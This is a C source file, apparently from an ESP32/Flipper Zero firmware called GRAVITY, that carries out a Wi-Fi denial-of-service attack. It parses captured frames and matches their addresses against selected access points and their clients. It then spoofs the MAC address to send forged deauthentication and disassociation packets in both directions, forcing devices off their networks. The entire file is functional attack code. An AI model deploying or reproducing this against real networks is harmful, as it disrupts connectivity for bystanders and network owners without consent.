#include "dos.h"
#include "common.h"
#include "deauth.h"
#include "esp_interface.h"
#include "esp_wifi.h"

const char *DOS_TAG = "dos@GRAVITY";
//uint8_t 

/* Final parsing of wireless frame prior to calling the deauth module to send the packet */
/* If thisAP is not NULL this function sends a deauth packet to its
   STA with the MAC of the AP and a disassoc packet to the AP with the MAC of the STA.
   If thisSTA is not NULL the function sends a deauth packet to both
   STAs, using the MAC of the AP.
*/
esp_err_t dosSendDeauth(uint8_t *srcAddr, uint8_t *destAddr, ScanResultAP *thisAP, ScanResultSTA *thisSTA) {
    uint8_t deauthSrc[6], deauthDest[6];
    /* Make sense of our parameters */
    if (thisAP != NULL) {
        /* Packet goes to or from an AP. Figure out whether srcAddr or destAddr is our STA */
        if (!memcmp(srcAddr, thisAP->espRecord.bssid, 6)) {
            /* Packet was from AP -> STA -- We want the same for deauth */
            memcpy(deauthSrc, srcAddr, 6);
            memcpy(deauthDest, destAddr, 6);
        } else if (!memcmp(destAddr, thisAP->espRecord.bssid, 6)) {
            /* Packet was STA -> AP --- Swap order for deauth */
            memcpy(deauthSrc, destAddr, 6);
            memcpy(deauthDest, srcAddr, 6);
        }

        #ifdef CONFIG_DEBUG_VERBOSE
            char strSrc[18];
            char strDest[18];
            mac_bytes_to_string(deauthSrc, strSrc);
            mac_bytes_to_string(deauthDest, strDest);
            #ifdef CONFIG_FLIPPER
                printf("Setting MAC to %s\n", strSrc);
            #else
                ESP_LOGI(DOS_TAG, "Setting MAC to %s", strSrc);
            #endif
        #endif
        /* Set MAC to deauthSrc */
        if (esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthSrc) != ESP_OK) {
            #ifdef CONFIG_FLIPPER
                printf("Failed to set MAC for DOS Deauth, continuing\n");
            #else
                ESP_LOGW(DOS_TAG, "Failed to set MAC (%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", deauthSrc[0], deauthSrc[1], deauthSrc[2], deauthSrc[3], deauthSrc[4], deauthSrc[5]);
            #endif
        }

        #ifdef CONFIG_DEBUG_VERBOSE
            #ifdef CONFIG_FLIPPER
                printf("Deauth to %s\n", strDest);
            #else
                ESP_LOGI(DOS_TAG, "Deauth to %s", strDest);
            #endif
        #endif

        /* Call deauth module here */
        deauth_standalone_packet(deauthSrc, deauthDest);
        /* Now set the MAC to STA's and send disassoc to AP */
        /* Check if it's broadcast first */
        if (memcmp(deauthDest, BROADCAST, 6) && esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthDest) != ESP_OK) {
            #ifdef CONFIG_FLIPPER
                printf("Failed to set MAC for disassoc, continuing\n");
            #else
                ESP_LOGW(DOS_TAG, "Failed to set MAC (%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", deauthDest[0], deauthDest[1], deauthDest[2], deauthDest[3], deauthDest[4], deauthDest[5]);
            #endif
        }
        #ifdef CONFIG_DEBUG_VERBOSE
            #ifdef CONFIG_FLIPPER
                printf("Disassoc to %s\n", strSrc);
            #else
                ESP_LOGI(DOS_TAG, "Disassoc to %s", strSrc);
            #endif
        #endif
        disassoc_standalone_packet(deauthDest, deauthSrc);
    } else {
        /* Packet goes to or from a scanned station */
        /* In this instance we'll deauth both the identified and unknown STAs */
        /* Set the MAC first this time */
        if (esp_wifi_set_mac(ESP_IF_WIFI_AP, thisSTA->apMac) != ESP_OK) {
            #ifdef CONFIG_FLIPPER
                printf("Failed to set MAC in DOS STA\n");
            #else
                ESP_LOGW(DOS_TAG, "Failed to set MAC in DOS STA\n");
            #endif
        }
        for (int z = 0; z < 2; ++z) {
            if (z == 0) {
                memcpy(deauthSrc, srcAddr, 6);
                memcpy(deauthDest, destAddr, 6);
            } else {
                memcpy(deauthSrc, destAddr, 6);
                memcpy(deauthDest, srcAddr, 6);
            }

            #ifdef CONFIG_DEBUG_VERBOSE
                #ifdef CONFIG_FLIPPER
                    printf("Deauth from %s to %s\n", deauthSrc, deauthDest);
                #else
                    ESP_LOGI(DOS_TAG, "Deauth from %s to %s", deauthSrc, deauthDest);
                #endif
            #endif

            /* Call deauth module here */
            deauth_standalone_packet(deauthSrc, deauthDest);
        }
    }
    return ESP_OK;
}

/* Determine whether we need to do anything in response to the current frame */
esp_err_t dosParseFrame(uint8_t *payload) {
    uint8_t srcAddr[6];
    uint8_t destAddr[6];

    memcpy(destAddr, &payload[4], 6);
    memcpy(srcAddr, &payload[10], 6);

    /* Is the SRC or DEST a selectedAP? */
    int i;
    for (i = 0; i < gravity_sel_ap_count && memcmp(destAddr, gravity_selected_aps[i]->espRecord.bssid, 6) && memcmp(srcAddr, gravity_selected_aps[i]->espRecord.bssid, 6); ++i) { }
 
    if (i < gravity_sel_ap_count) {
        /* Found the AP */

        /* Send deauth packet to other end */
        dosSendDeauth(srcAddr, destAddr, gravity_selected_aps[i], NULL);
    } else {
        /* Not an AP. See if it's a STA */
        int cliCount = 0;
        ScanResultSTA **allClients = collateClientsOfSelectedAPs(&cliCount);
        for (i = 0; i < cliCount && memcmp(destAddr, allClients[i]->mac, 6) &&
                memcmp(srcAddr, allClients[i]->mac, 6); ++i) { }
        if (i < cliCount) {
            /* Found one of selectedAPs' STA's - deauth it */
            dosSendDeauth(srcAddr, destAddr, NULL, allClients[i]);
        } else {
            #ifndef CONFIG_FLIPPER
                char src[18], dest[18];
                mac_bytes_to_string(destAddr, dest);
                mac_bytes_to_string(srcAddr, src);
                ESP_LOGI(DOS_TAG, "Ignoring packet [ %s ] => [ %s ]", src, dest);
            #endif
        }
        free(allClients);
    }
    return ESP_OK;
}